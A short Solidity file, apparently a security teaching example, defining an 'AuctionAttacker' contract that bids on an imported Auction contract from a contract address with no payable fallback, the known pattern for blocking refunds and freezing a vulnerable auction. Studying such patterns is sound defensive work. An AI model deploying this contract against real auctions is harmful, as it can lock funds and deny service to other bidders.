pragma solidity ^0.4.0;

import "./Auction.sol";

contract AuctionAttacker {

    Auction auction;

    function AuctionAttacker(address _auction) public {
        auction = Auction(_auction);
    }

    function bidAuction() public payable {
        auction.bid.value(msg.value)();
    }

}
